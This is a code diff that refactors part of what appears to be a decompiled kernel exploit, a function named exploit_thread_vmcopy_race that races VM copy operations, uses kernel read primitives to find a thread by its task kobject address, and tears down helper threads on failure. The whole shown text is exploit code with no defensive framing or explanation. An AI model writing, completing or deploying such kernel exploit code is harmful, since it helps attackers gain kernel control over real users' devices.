@@ -239,6 +239,51 @@ static inline uint32_t vmcopy_find_thread_policy_offset(
   return foundOffset;
 }
 
+static inline bool vmcopy_thread_port_is_live(thread_act_t thread)
+{
+  return thread + 1 >= 2;
+}
+
+static inline thread_act_t vmcopy_take_thread_for_kobject(
+        __int64 kreadCtx,
+        thread_act_t *threads,
+        size_t threadListBytes,
+        uint64_t wantedKobject)
+{
+  for ( size_t offset = 0; offset != threadListBytes; offset += sizeof(thread_act_t) )
+  {
+    thread_act_t *slot = (thread_act_t *)((char *)threads + offset);
+    thread_act_t thread = *slot;
+
+    if ( thread && get_task_kobject_addr_from_field32(kreadCtx, thread) == wantedKobject )
+    {
+      *slot = 0;
+      return thread;
+    }
+  }
+
+  return 0;
+}
+
+static inline void vmcopy_terminate_thread_if_live(thread_act_t *threadSlot)
+{
+  if ( vmcopy_thread_port_is_live(*threadSlot) )
+  {
+    thread_terminate(*threadSlot);
+    *threadSlot = 0;
+  }
+}
+
+static inline void vmcopy_terminate_thread_list(thread_act_t *threads, size_t threadListBytes)
+{
+  for ( size_t offset = 0; offset != threadListBytes; offset += sizeof(thread_act_t) )
+  {
+    thread_act_t thread = *(thread_act_t *)((char *)threads + offset);
+    if ( thread )
+      thread_terminate(thread);
+  }
+}
+
 static inline void vmcopy_patch_memory_entry_page(__int64 kreadCtx, __int64 pageInfoKaddr, uint32_t ppnum, __int128 scratch[2])
 {
   memset(scratch, 0, 32);
@@ -7846,13 +7891,8 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   int v42; // w8
   int v43; // w8
   __int64 v44; // x22
-  __int64 v45; // x22
-  unsigned int v46; // w1
   __int64 v47; // x8
   __int64 v48; // x28
-  thread_act_t v51; // w0
-  __int64 j; // x22
-  thread_act_t v53; // w0
   int v54; // w8
   struct_krwCtx *v55; // x0
   int v56; // w22
@@ -8106,42 +8146,22 @@ LABEL_47:
     pthread_join(v149, 0);
     if ( v104 <= 10001 )
       *v35 = v44;
-    v45 = 0;
-    while ( 1 )
+    thread_act_t capturedThread = vmcopy_take_thread_for_kobject(*v2, (thread_act_t *)v180, sizeof(v180), v23);
+    if ( capturedThread )
     {
-      v46 = *(uint32_t *)((char *)v180 + v45);
-      if ( v46 )
-      {
-        if ( get_task_kobject_addr_from_field32(*v2, v46) == v23 )
-          break;
-      }
-      v45 += 4;
-      if ( v45 == 256 )
-      {
-        v47 = v150;
-        goto LABEL_55;
-      }
+      v150 = 3;
+      *(uint32_t *)(someStruct + 672) = capturedThread;
+      v47 = 3;
     }
-    v150 = 3;
-    *(uint32_t *)(someStruct + 672) = *(uint32_t *)((char *)v180 + v45);
-    *(uint32_t *)((char *)v180 + v45) = 0;
-    v47 = 3;
-LABEL_55:
+    else
+    {
+      v47 = v150;
+    }
     v48 = *(uint64_t *)(v36 + 296);
     if ( v41 == v48 || v48 == 0 || v47 != 3 )
     {
-      v51 = *(uint32_t *)(someStruct + 672);
-      if ( v51 + 1 >= 2 )
-      {
-        thread_terminate(v51);
-        *(uint32_t *)(someStruct + 672) = 0;
-      }
-      for ( j = 0; j != 256; j += 4 )
-      {
-        v53 = *(uint32_t *)((char *)v180 + j);
-        if ( v53 )
-          thread_terminate(v53);
-      }
+      vmcopy_terminate_thread_if_live((thread_act_t *)(someStruct + 672));
+      vmcopy_terminate_thread_list((thread_act_t *)v180, sizeof(v180));
 LABEL_68:
       v54 = 87;
       continue;
